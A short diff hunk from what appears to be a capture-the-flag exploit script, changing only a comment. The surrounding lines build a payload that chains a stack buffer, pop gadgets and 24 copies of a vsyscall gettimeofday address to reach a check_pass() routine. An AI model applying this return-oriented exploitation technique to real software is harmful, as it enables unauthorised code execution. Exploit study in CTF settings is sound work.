@@ -71,7 +71,7 @@ sys_gettimeofday = p64(0xffffffffff600400)
 #
 # after 24 times of calling gettimeofday(), 
 # check_pass() will be called with rdi of 'timeval'
-# only if we can supply suitable 'timeval', then bingo!
+# if we can supply suitable 'timeval', then bingo!
 #
 
 payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  
